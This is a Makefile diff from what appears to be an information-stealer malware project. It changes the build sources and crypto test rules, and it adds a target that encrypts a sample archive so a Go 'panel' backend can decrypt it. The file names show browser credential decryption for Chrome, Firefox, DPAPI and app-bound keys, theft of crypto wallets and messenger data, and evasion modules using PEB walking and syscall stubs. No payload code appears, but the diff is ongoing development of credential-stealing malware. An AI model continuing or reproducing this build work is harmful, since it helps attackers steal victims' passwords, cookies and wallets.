@@ -49,7 +49,7 @@ SRCS = src/main.c \
        src/crypto/chrome_crypto.c \
        src/crypto/firefox_crypto.c \
        src/crypto/chacha_poly.c \
-       src/crypto/monocypher.c \
+       src/crypto/archive_crypt.c \
        src/crypto/dpapi.c \
        src/crypto/chrome_key.c \
        src/crypto/appbound.c \
@@ -120,8 +120,8 @@ TEST_CFLAGS = -Wall -Wextra -O2 -Iinclude -Isrc/parsers -Isrc/utils -std=c11
 test-unit: test-crypto test-peb test-chromium test-wallets test-messengers test-network test-evasion
 	@echo "=== ALL UNIT TESTS PASSED ==="
 
-test-crypto: tests/test_crypto.c src/crypto/chacha_poly.c src/crypto/monocypher.c include/monocypher.h src/utils/secure_zero.c
-	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_crypto tests/test_crypto.c src/crypto/chacha_poly.c src/crypto/monocypher.c src/utils/secure_zero.c
+test-crypto: tests/test_crypto.c src/crypto/chacha_poly.c src/utils/secure_zero.c
+	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_crypto tests/test_crypto.c src/crypto/chacha_poly.c src/utils/secure_zero.c
 	./tests/test_crypto
 
 test-sqlite: tests/test_sqlite.c src/parsers/sqlite.c
@@ -201,8 +201,19 @@ test-firefox-crypto: tests/test_firefox_crypto.c
 	./tests/test_firefox_crypto
 
 test-archive-crypt: tests/test_archive_crypt.c
-	$(TEST_CC) $(TEST_CFLAGS) -Isrc -Isrc/crypto -o tests/test_archive_crypt tests/test_archive_crypt.c src/crypto/chacha_poly.c src/crypto/monocypher.c src/utils/secure_zero.c -lssl -lcrypto
+	$(TEST_CC) $(TEST_CFLAGS) -Isrc -Isrc/crypto -o tests/test_archive_crypt tests/test_archive_crypt.c src/crypto/chacha_poly.c src/utils/secure_zero.c -lssl -lcrypto
 	./tests/test_archive_crypt
+
+# C→Go interop fixture: encrypts a fixed pattern with the client's
+# archive_encrypt (PBKDF2-SHA256 seed + RFC 8439 AEAD) into
+# panel/testdata/archive_sample.bin; the Go test TestDecryptArchive_CSamples
+# must decrypt it with x/crypto chacha20poly1305. Regenerate after every
+# MIRAGE_SEED change.
+test-interop-gen: tests/test_interop_gen.c src/crypto/archive_crypt.c src/crypto/chacha_poly.c src/crypto/monocypher.c src/types/peb.c src/types/hash.c src/types/export_resolve.c src/crypto/bcrypt_peb.c asm/mirage_stubs_v2.asm
+	@mkdir -p panel/testdata
+	@$(NASM) -f win64 asm/mirage_stubs_v2.asm -o build/getpeb_stub.o
+	$(TEST_CC) $(TEST_CFLAGS) -Iinclude -Isrc -Isrc/crypto -Isrc/utils -Isrc/types -o tests/test_interop_gen tests/test_interop_gen.c src/crypto/archive_crypt.c src/crypto/chacha_poly.c src/crypto/monocypher.c src/utils/secure_zero.c src/types/peb.c src/types/hash.c src/types/export_resolve.c src/crypto/bcrypt_peb.c build/getpeb_stub.o tests/ssn_shim.c -lbcrypt -lssl -lcrypto
+	./tests/test_interop_gen
 
 test-json-extract: tests/test_json_extract.c
 	$(TEST_CC) $(TEST_CFLAGS) -DTEST_JSON_EXTRACT_STANDALONE -o tests/test_json_extract tests/test_json_extract.c
